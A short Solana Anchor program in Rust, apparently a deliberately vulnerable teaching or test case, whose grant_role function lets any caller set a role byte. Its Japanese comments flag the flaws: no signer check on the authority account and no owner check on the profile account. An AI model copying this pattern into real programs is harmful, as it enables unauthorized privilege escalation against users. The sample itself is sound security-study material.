use anchor_lang::prelude::*;
declare_id!("CaseA111111111111111111111111111111111111111");

#[program]
pub mod user_role {
    // ユーザーに新しいロールを付与する関数
    pub fn grant_role(ctx: Context<GrantRole>, role: u8) -> Result<()> {
        // authority に Signerチェックがない
        let account = &mut ctx.accounts.profile_info;
        // ownerチェックがないままデータを直接更新
        account.data[0] = role;
        Ok(())
    }
}

#[derive(Accounts)]
pub struct GrantRole<'info> {
    /// CHECK: サイン済みか未サインか問わず呼び出せる
    pub authority: UncheckedAccount<'info>,
    /// CHECK: プログラム所有者の検証をしていない
    #[account(mut)]
    pub profile_info: AccountInfo<'info>,
}